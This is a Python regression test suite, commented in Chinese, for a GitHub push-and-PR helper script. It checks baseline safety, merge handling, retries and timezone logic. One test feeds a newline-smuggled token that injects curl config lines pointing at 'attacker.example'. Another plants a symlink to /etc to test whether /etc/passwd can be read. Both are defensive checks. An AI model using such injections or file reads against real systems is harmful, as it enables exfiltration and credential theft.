#!/usr/bin/env python3
"""审查发现的 6 个测试盲区，全部沉淀为常驻回归。

背景：修复前 41 项测试全绿，但下面这些一条都没覆盖 ——
本轮 1 个 P0 + 3 个 P1 全部出自这里。它们的共同点是
「防护正确地拦住了，然后把用户推向更糟的地方」，静态审查看不出来。

对应：P0-1 / P1-1 / P1-2 / P1-3 / P2-1 / P3-1
"""
import os
import shutil
import sys

import test_pr_flow as T
from test_pr_flow import GH, main_file, read, run, setup_repo, write

ROOT, STATE = T.ROOT, T.STATE


def _fresh(mod):
    """每个用例一份干净仓库 + 从 **mod 所在文件** 重新加载的实例。

    路径取自 mod.__file__，测的才是命令行传入的那份代码
    （硬编码路径会让坏副本也「通过」，测试形同虚设）。
    """
    T._rmtree_stubborn(ROOT)
    T.remove_any(STATE)
    return mod


def _reload(mod):
    """从 **mod 所在文件** 重新加载一份独立实例。

    路径取自 mod.__file__，测的才是命令行传入的那份代码。
    """
    import importlib.util
    spec = importlib.util.spec_from_file_location("bs", mod.__file__)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    m.ROOT, m.STATE_PATH = ROOT, STATE
    m.TOKEN = "fake"
    return m


# ---------------------------------------------------------------- P0-1

def force_file_must_not_bypass_p01(mod, label):
    """P0-1：--force-file 不得绕过「本地副本过期」，未点名文件不得被静默回退。

    曾经 `bypass = force or bool(allowed)`：任何一个 --force-file 都会放掉
    整层 P0-1。而 P0-1 是全局闸门（你的副本是不是从最新主干改的），
    用户点名 e1.txt 时并不知道副本已过期，无从同意「回退 e2」。
    """
    _fresh(mod)
    files = {"e1.txt": ("100644", b"M_v1\n"), "e2.txt": ("100644", b"N_v1\n")}
    setup_repo(files)
    gh = GH(files)
    run(mod, gh, ["--init-baseline", "--yes"])

    T.other_commit(gh, {"e1.txt": b"M_remote\n", "e2.txt": b"N_remote\n"})
    write("e1.txt", "M_mine\n")                    # 本地副本过期，只改 e1

    out, err = run(mod, gh, ["--yes", "--force-file", "e1.txt", "-m", "改 e1"])
    # 断言**文件级结果**，不断言文案：被 P0-1 拦下时 e1 不会进主干。
    # 用 "落后" in out 会误判 —— 放行警告那行也含「本地副本落后/未声明…
    # 已放行」，于是绕过时测试照样报 PASS，形同虚设（实测踩过）。
    e1_held = main_file(gh, "e1.txt") == "M_remote\n"
    e2_kept = main_file(gh, "e2.txt") == "N_remote\n"

    print(f"\n=== {label} ===")
    print(f"  被拦下：e1 未进主干       : {e1_held}")
    print(f"  他人对 e2 的改动未被回退  : {e2_kept}")
    return e1_held and e2_kept


def force_overwrite_visibility(mod, label):
    """P0-1 附带：全局放行时，风险必须在屏幕上可见（不能说「不会静默覆盖」）。"""
    _fresh(mod)
    files = {"e1.txt": ("100644", b"M_v1\n"), "e2.txt": ("100644", b"N_v1\n")}
    setup_repo(files)
    gh = GH(files)
    run(mod, gh, ["--init-baseline", "--yes"])

    T.other_commit(gh, {"e1.txt": b"M_remote\n", "e2.txt": b"N_remote\n"})
    write("e1.txt", "M_mine\n")
    out, _ = run(mod, gh, ["--yes", "--force-overwrite", "-m", "改 e1"])
    warns = ("回退" in out)
    e2_kept = main_file(gh, "e2.txt") == "N_remote\n"

    print(f"\n=== {label} ===")
    print(f"  明确提到「回退」风险      : {warns}")
    print(f"  e2 未被回退               : {e2_kept}")
    return warns and e2_kept


# ---------------------------------------------------------------- P1-2

def pull_noop_releases_p01(mod, label):
    """P1-2：--pull 空转时也必须解除 P0-1，否则用户被永久挡住。

    触发场景（都是实测）：
      ① 远端删了某个文件（脚本不支持删除，该文件不在待合并集合里）
      ② 远端改动后内容等价（改回原样 / 只动了别处）
    用户的出路只有 --pull（空转）和 --force-overwrite（摧毁防护）→ 死锁。
    """
    results = {}
    for name, advance in (("远端删除文件", "delete"), ("远端改动等价", "equiv")):
        _fresh(mod)
        files = {"a.txt": ("100644", b"v1\n"), "b.txt": ("100644", b"v1\n")}
        setup_repo(files)
        gh = GH(files)
        run(mod, gh, ["--init-baseline", "--yes"])

        if advance == "delete":
            cur = dict(gh.files_of("main"))
            cur.pop("b.txt")
            gh.refs["main"] = gh._commit(cur, gh.refs["main"])
        else:
            T.other_commit(gh, {"b.txt": b"v1\n"})   # 内容等价，commit 前进

        write("a.txt", "v2\n")
        out1, _ = run(mod, gh, ["--yes", "-m", "改 a"])
        blocked1 = "落后" in out1

        run(mod, gh, ["--pull", "--yes"])
        out3, _ = run(mod, gh, ["--yes", "-m", "改 a"])
        blocked2 = "落后" in out3
        landed = main_file(gh, "a.txt") == "v2\n"
        results[name] = blocked1 and not blocked2 and landed

    print(f"\n=== {label} ===")
    for k, v in results.items():
        print(f"  {k:<14} 先拦→pull→放行 : {v}")
    return all(results.values())


# ---------------------------------------------------------------- P1-1

def hold_then_edit_then_merge(mod, label):
    """P1-1：--hold 攒改动后 --merge，后续推送不得出现假冲突。

    曾经 --hold 不刷新基线，--pull 拿陈旧 base 做三方合并，
    把「v2→v3 我自己的连续改动」判成冲突并写进冲突标记 ——
    工具把用户从「推送被拦」引向「手工解冲突」。
    """
    _fresh(mod)
    setup_repo({"i.txt": ("100644", b"v1\n")})
    gh = GH({"i.txt": ("100644", b"v1\n")})
    run(mod, gh, ["--init-baseline", "--yes"])

    write("i.txt", "v2\n")
    run(mod, gh, ["--yes", "--hold", "-b", "task/i", "-m", "推 v2"])

    write("i.txt", "v3\n")                          # 攒新改动，还没推
    run(mod, gh, ["--merge", "--yes"])
    after_merge = main_file(gh, "i.txt") == "v2\n"

    out, err = run(mod, gh, ["--yes", "-m", "推 v3"])
    blocked = "落后" in out or "基线未记录" in out
    no_marker = "<<<<<<<" not in read("i.txt")
    landed = main_file(gh, "i.txt") == "v3\n"

    print(f"\n=== {label} ===")
    print(f"  --merge 后主干 = v2       : {after_merge}")
    print(f"  推 v3 未被拦              : {not blocked}")
    print(f"  本地无冲突标记            : {no_marker}")
    print(f"  主干最终 = v3             : {landed}")
    return after_merge and not blocked and no_marker and landed


def hold_does_not_clobber_on_pull(mod, label):
    """P1-1 回归防线：--hold 后基线不得记成分支内容。

    若记成分支内容，--pull 会看到 local == base 而判定「本地无改动」，
    直接用主干（他人的）版本覆盖本地，把刚推到分支的改动静默抹掉。
    """
    _fresh(mod)
    base = "one\ntwo\nthree\n"
    setup_repo({"c.txt": ("100644", base.encode())})
    gh = GH({"c.txt": ("100644", base.encode())})
    run(mod, gh, ["--init-baseline", "--yes"])

    write("c.txt", base.replace("two", "TWO-B"))
    run(mod, gh, ["--yes", "--hold", "-b", "task/b", "-m", "我改 two"])

    T.other_commit(gh, {"c.txt": base.replace("two", "TWO-A").encode()})
    run(mod, gh, ["--pull", "--yes"])                # 主干与他人改动合并
    local = read("c.txt")
    kept_mine = "TWO-B" in local                     # 我的改动不能被静默抹掉
    merged_or_conflict = ("TWO-A" in local) or ("<<<<<<<" in local)

    print(f"\n=== {label} ===")
    print(f"  我的 TWO-B 未被静默覆盖  : {kept_mine}")
    print(f"  远端改动已合入/标冲突    : {merged_or_conflict}")
    return kept_mine and merged_or_conflict


# ---------------------------------------------------------------- P1-3

def reuse_branch_makes_new_pr(mod, label):
    """P1-3：同名 -b 二次推送必须新建 PR，不能复用已关闭/已合并的旧 PR。

    复用旧 PR 的后果：推送成功、改动不进主干、还报「合并冲突」误导用户。
    """
    _fresh(mod)
    setup_repo({"g.txt": ("100644", b"v1\n")})
    gh = GH({"g.txt": ("100644", b"v1\n")})
    run(mod, gh, ["--init-baseline", "--yes"])

    write("g.txt", "v2\n")
    run(mod, gh, ["--yes", "-b", "task/g", "-m", "第一次"])
    first_landed = main_file(gh, "g.txt") == "v2\n"

    write("g.txt", "v3\n")
    run(mod, gh, ["--yes", "-b", "task/g", "-m", "第二次"])
    two_prs = len(gh.prs) == 2
    second_landed = main_file(gh, "g.txt") == "v3\n"

    print(f"\n=== {label} ===")
    print(f"  第一次 v2 进主干          : {first_landed}")
    print(f"  新建了 PR（共 2 个）      : {two_prs}")
    print(f"  第二次 v3 进主干          : {second_landed}")
    return first_landed and two_prs and second_landed


# ---------------------------------------------------------------- P2-1

def dangling_symlink_no_crash(mod, label):
    """P2-1：悬空符号链接不得让大文件预检裸崩（FileNotFoundError）。

    仓库里可以有指向不存在目标的软链（git 允许提交这种 blob），
    预检处 os.path.getsize 会抛异常；此时 blob 已建、分支已建，
    状态未落盘 → 留下脏远端状态。
    """
    _fresh(mod)
    setup_repo({"keep.txt": ("100644", b"keep\n")})
    gh = GH({"keep.txt": ("100644", b"keep\n")})
    run(mod, gh, ["--init-baseline", "--yes"])

    full = os.path.join(ROOT, "dangling")
    if os.path.lexists(full):
        os.unlink(full)
    os.symlink("no-such-target", full)

    out, err = run(mod, gh, ["--yes", "-m", "软链"])
    no_crash = err is None or "FileNotFoundError" not in str(err)

    print(f"\n=== {label} ===")
    print(f"  未抛 FileNotFoundError    : {no_crash}")
    return no_crash


# ---------------------------------------------------------------- P3-1

def pull_keeps_committed_change_when_no_baseline(mod, label):
    """基线缺失时，--pull 不得用远端覆盖掉**已 commit** 的本地改动。

    `_base_bytes()` 在基线没记该文件时回退到 `git rev-parse HEAD:<rel>`。
    但用户 commit 之后，git HEAD **已经含其改动**，于是：
      · `local == base`（工作区 == HEAD）恒成立
      · `no_local_change` 判成 True → 直接用远端覆盖
      · 用户已 commit 的改动静默消失，且零冲突提示

    同时要防**过度修复**：若为此一律丢弃 git HEAD 那份 base，
    则「改动还在工作区、没 commit」时会退化成空 base、撞出假冲突。
    判据应是「工作区是否已比 HEAD 新」：
      · local != base → 改动还没进 HEAD，HEAD 是纯净祖先 → 可信，照常用
      · local == base → 无法排除已 commit → 不可信，按基点未知处理

    本用例两个方向都要锁住。
    """
    # 两边改动要**不相邻**：git merge-file 把相邻行视作同一个 hunk，
    # 紧挨着的两处改动会被判冲突（实测）。那是 git 的正常行为，
    # 与本用例要验的「base 是否可信」无关，隔开一行才能验到点上。
    V1 = "l1\nl2\nl3\nl4\nl5\n"
    MINE = "l1\nMY-CHANGE\nl3\nl4\nl5\n"          # 本地改 l2
    REMOTE = "l1\nl2\nl3\nREMOTE-EDIT\nl5\n"      # 远端改 l4

    def build(commit_change):
        _fresh(mod)
        setup_repo({"m.rs": ("100644", V1.encode())})
        gh = GH({"m.rs": ("100644", V1.encode())})
        # 让基线**不记录** m.rs：init 时本地≠远端会被故意跳过
        write("m.rs", "TEMP-DIFFERENT\n")
        run(mod, gh, ["--init-baseline", "--yes"])
        write("m.rs", V1)
        # 用户改动
        write("m.rs", MINE)
        if commit_change:
            T.git("add", "-A")
            T.git("commit", "-qm", "我的改动")
        T.other_commit(gh, {"m.rs": REMOTE.encode()})
        run(mod, gh, ["--pull", "--yes"])
        return read("m.rs")

    # A：已 commit → 改动必须保住（冲突标记或内容留存都算保住）
    after_commit = build(True)
    kept = "MY-CHANGE" in after_commit

    # B：未 commit → 应正常自动合并，两方改动都在，且不产生冲突标记
    after_dirty = build(False)
    both = "MY-CHANGE" in after_dirty and "REMOTE-EDIT" in after_dirty
    no_fake_conflict = "<<<<<<<" not in after_dirty

    print(f"\n=== {label} ===")
    print(f"  A 已 commit：改动保住      : {kept}")
    print(f"  B 未 commit：两方改动都在  : {both}")
    print(f"  B 未 commit：无假冲突标记  : {no_fake_conflict}")
    return kept and both and no_fake_conflict


def token_whitelist_blocks_injection(mod, label):
    """token 白名单：含换行的 token 必须被拒（否则可注入 curl 配置指令）。

    变异测试发现的**真盲区**：曾经只用临时脚本验证过，没沉淀成常驻回归，
    于是注入该变异后测试仍然全绿。

    配置文件写的是 `header = "..."`，token 里混入换行就能在下一行注入
    `output = /path`、`url = attacker.host` 等指令。
    """
    m2 = _reload(mod)
    m2.TOKEN = "abc\noutput = /tmp/pwned\nurl = http://attacker.example"
    rejected = False
    try:
        with m2._auth_config():
            pass
    except SystemExit:
        rejected = True
    except Exception:
        rejected = False

    # 正常 token 不能被误伤（既要拦住坏的，也不能挡住好的）
    m3 = _reload(mod)
    good = "github_pat_11ABCdef_123456"
    m3.TOKEN = good
    wrote_ok = False
    try:
        with m3._auth_config() as p:
            wrote_ok = open(p).read() == f'header = "Authorization: Bearer {good}"\n'
    except Exception:
        wrote_ok = False

    print(f"\n=== {label} ===")
    print(f"  含换行的 token 被拒      : {rejected}")
    print(f"  正常 token 未被误伤      : {wrote_ok}")
    return rejected and wrote_ok


def safe_rel_blocks_symlink_escape(mod, label):
    """safe_rel：仓库内指向外部的符号链接必须被拦（realpath 而非 normpath）。

    变异测试发现的**真盲区**：现有 symlink 用例只测「指向仓库内部」的链接，
    没测「指向仓库外部」。normpath 只做字符串规整，`etcdir -> /etc`
    时 `etcdir/passwd` 能通过检查，open() 却读到 /etc/passwd。
    """
    _fresh(mod)
    setup_repo({"keep.txt": ("100644", b"keep\n")})
    evil = os.path.join(ROOT, "etcdir")
    if os.path.lexists(evil):
        os.unlink(evil)
    os.symlink("/etc", evil)                 # 仓库内指向外部

    escaped = mod.safe_rel("etcdir/passwd")
    normal_ok = mod.safe_rel("keep.txt") == "keep.txt"
    outside_ok = mod.safe_rel("../outside.txt") is None

    print(f"\n=== {label} ===")
    print(f"  etcdir/passwd 被拦       : {escaped is None}")
    print(f"  正常路径仍可用           : {normal_ok}")
    print(f"  ../ 仍被拦               : {outside_ok}")
    if evil and os.path.islink(evil):
        os.unlink(evil)
    return escaped is None and normal_ok and outside_ok


def retry_skips_non_idempotent(mod, label):
    """幂等：非 GET 的写请求遇到 5xx 不得重试。

    变异测试发现的**真盲区**：没有任何用例覆盖「5xx 时重试几次」。
    PATCH /git/refs 重试会撞 422 not fast-forward，而调用方那句
    「出现并发提交，已中止」会把自己的重试**误报成他人抢先提交**。
    """
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer

    hits = {"n": 0}

    class H(BaseHTTPRequestHandler):
        def do_PATCH(self):
            hits["n"] += 1
            self.send_response(500)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def do_GET(self):
            hits["n"] += 1
            self.send_response(500)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    m = _reload(mod)
    m.BASE = f"http://127.0.0.1:{srv.server_address[1]}"
    m.TOKEN = "fake"

    # 写请求：不重试 → 只打 1 次
    hits["n"] = 0
    try:
        m.api("PATCH", "/git/refs/heads/main", {"sha": "x"}, retries=3, timeout=5)
    except SystemExit:
        pass
    writes = hits["n"]

    # 读请求：允许重试 → 1 + 3 = 4 次
    hits["n"] = 0
    try:
        m.api("GET", "/git/ref/heads/main", retries=3, timeout=5)
    except SystemExit:
        pass
    reads = hits["n"]

    srv.shutdown()
    print(f"\n=== {label} ===")
    print(f"  PATCH 5xx 请求次数 = 1   : {writes == 1}  （实际 {writes}）")
    print(f"  GET   5xx 请求次数 > 1   : {reads > 1}  （实际 {reads}）")
    return writes == 1 and reads > 1


def conflict_with_unknown_base(mod, label):
    """合并基点未知（base = None）且发生冲突时，不得崩溃、不得伪造 .base。

    触发条件（三者同时成立）：
      ① 基线没记这个文件（init 检出「本地 ≠ 远端」时会故意跳过）
      ② 本地 git HEAD 里也没有 → 文件是 untracked 的新文件
      ③ 三方合并确实判成冲突

    曾经崩溃在写盘那一步：`.base` 用 base 原值写，而 base 是 None →
    TypeError，整个 pull 崩在半路，冲突文件既没记录也没提示。
    也不能改写成空文件 —— 那等于宣称「合并基点是空文件」，
    与「不知道基点」是两回事，会误导人工比对。
    """
    import json as _json
    _fresh(mod)
    # 仓库只跟踪 keep.txt；c.txt 远端有、本地有，但不进 git
    setup_repo({"keep.txt": ("100644", b"keep\n")})
    gh = GH({"keep.txt": ("100644", b"keep\n"), "c.txt": ("100644", b"remote\n")})
    write("c.txt", "local\n")                        # untracked，且与远端不同
    run(mod, gh, ["--init-baseline", "--yes"])

    st = _json.load(open(STATE))
    base_absent = "c.txt" not in (st.get("files") or {})   # 前提：基线确实没记

    out, err = run(mod, gh, ["--pull", "--yes"])
    no_crash = err is None or "TypeError" not in str(err)
    # 副产物现在写在**仓库外**（P0-8）：留在仓库内会被 detect_changes
    # 的 --untracked-files=all 拾取，下次推送直接上远端。
    remote_written = os.path.exists(mod._conflict_path("c.txt", "remote"))
    base_not_faked = not os.path.exists(mod._conflict_path("c.txt", "base"))
    # 且绝不能再出现在仓库内
    not_in_repo = not os.path.exists(os.path.join(ROOT, "c.txt.remote"))
    marked = "<<<<<<<" in read("c.txt")              # 冲突标记已写入本地
    recorded = "c.txt" in (_json.load(open(STATE)).get("conflicts") or [])

    print(f"\n=== {label} ===")
    print(f"  前提：基线未记录 c.txt   : {base_absent}")
    print(f"  未抛 TypeError           : {no_crash}")
    print(f"  生成 .remote（仓库外）   : {remote_written}")
    print(f"  未伪造 .base             : {base_not_faked}")
    print(f"  仓库内无副产物           : {not_in_repo}")
    print(f"  冲突已标记并记入状态     : {marked and recorded}")
    return (base_absent and no_crash and remote_written
            and base_not_faked and not_in_repo and marked and recorded)


def bad_stale_days_friendly(mod, label):
    """P3-1：--stale-days 非法值给友好提示，不是裸 ValueError traceback。"""
    _fresh(mod)
    setup_repo({"h.txt": ("100644", b"v1\n")})
    gh = GH({"h.txt": ("100644", b"v1\n")})
    run(mod, gh, ["--init-baseline", "--yes"])

    out, err = run(mod, gh, ["--prune", "--stale-days", "abc"])
    friendly = err is not None and "stale-days" in str(err) and "整数" in str(err)
    no_traceback = err is not None and "invalid literal" not in str(err)

    print(f"\n=== {label} ===")
    print(f"  友好提示                  : {friendly}")
    print(f"  非裸 traceback            : {no_traceback}")
    return friendly and no_traceback


# ---------------------------------------------------------------- P3-2

def days_since_uses_utc(mod, label):
    """P3-2：_days_since 按 UTC 解析 GitHub 时间戳（不是本地时区）。

    time.mktime 按本地时区解析 UTC 时间戳，东八区下会偏约 8 小时，
    让 --prune 的 3 天宽限期提前约 1/3 天触发。

    必须在**非 UTC 时区**下验证：本容器是 UTC，此时 timegm 与 mktime
    结果完全相同，变异后测试照样全绿 —— 变异测试把它判成 SURVIVED，
    但那是环境造成的**等价变异**（假警报），不是真盲区。

    TZ 用 **POSIX 格式** 'CST-8'（东八区），不用 'Asia/Shanghai'：
    后者要读 /usr/share/zoneinfo，而容器/沙盒常没有 tzdata（重启还可能丢），
    那时 TZ 静默失效、偏移量仍是 0，这条测试就退化成等价变异。
    POSIX 格式由 libc 直接解析，不依赖任何文件。子进程里断言偏移非 0，
    失效就报错，不静默降级成「通过」。
    """
    import subprocess as _sp
    import time as _t

    ts = _t.strftime("%Y-%m-%dT%H:%M:%SZ",
                     _t.gmtime(_t.time() - 3 * 86400 - 3600))   # 3 天 +1 小时前
    code = (
        "import os, time, importlib.util\n"
        "os.environ['TZ'] = 'CST-8'\n"
        "time.tzset()\n"
        "assert time.timezone != 0, 'TZ 未生效：tzdata 缺失或格式不支持'\n"
        "spec = importlib.util.spec_from_file_location('pa', %r)\n"
        "m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)\n"
        "print(repr(m._days_since(%r)))\n" % (mod.__file__, ts)
    )
    try:
        p = _sp.run([sys.executable, "-c", code], capture_output=True,
                    text=True, timeout=60)
        d = float(eval((p.stdout or "None").strip()))
    except Exception:
        d = None

    # 正确（timegm）：约 3.04 天。变异（mktime @ UTC+8）：约 3.38 天。
    ok = d is not None and 2.9 < d < 3.3

    print(f"\n=== {label} ===")
    print(f"  TZ=CST-8(东八区) 下 3d+1h → {d} 天 : {ok}")
    print("  （UTC 环境下 timegm/mktime 等价，必须换时区才能暴露）")
    return ok


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/data/workspace/push_api.py"
    mod = T.load_mod(target, "bsmod")
    results = []
    for fn in (force_file_must_not_bypass_p01, force_overwrite_visibility,
               pull_noop_releases_p01, hold_then_edit_then_merge,
               hold_does_not_clobber_on_pull, reuse_branch_makes_new_pr,
               dangling_symlink_no_crash, bad_stale_days_friendly,
               days_since_uses_utc, conflict_with_unknown_base,
               pull_keeps_committed_change_when_no_baseline,
               token_whitelist_blocks_injection, safe_rel_blocks_symlink_escape,
               retry_skips_non_idempotent):
        try:
            ok = fn(mod, fn.__name__)
            results.append((fn.__name__, ok))
        except Exception:
            import traceback
            traceback.print_exc()
            results.append((fn.__name__, False))
    shutil.rmtree(ROOT, ignore_errors=True)
    for ext in ("", ".corrupt"):
        try:
            os.unlink(STATE + ext)
        except (FileNotFoundError, IsADirectoryError):
            pass
    print("\n---- 汇总 ----")
    for n, ok in results:
        print(f"  {'PASS' if ok else 'FAIL'}  {n}")
    print("总判定:", "ALL PASS" if all(o for _, o in results) else "有失败")
